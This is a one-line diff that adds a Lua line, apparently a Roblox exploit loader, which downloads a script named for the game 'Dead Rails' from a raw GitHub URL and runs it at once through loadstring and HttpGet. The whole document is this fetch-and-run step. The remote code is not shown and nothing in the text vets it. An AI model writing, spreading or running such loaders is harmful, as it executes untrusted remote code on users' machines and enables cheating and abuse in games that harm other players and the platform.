@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LengthRescuer49/loaders/main/loaders/dead-rails-spam1-g4w97ub6ghq51n.lua"))()
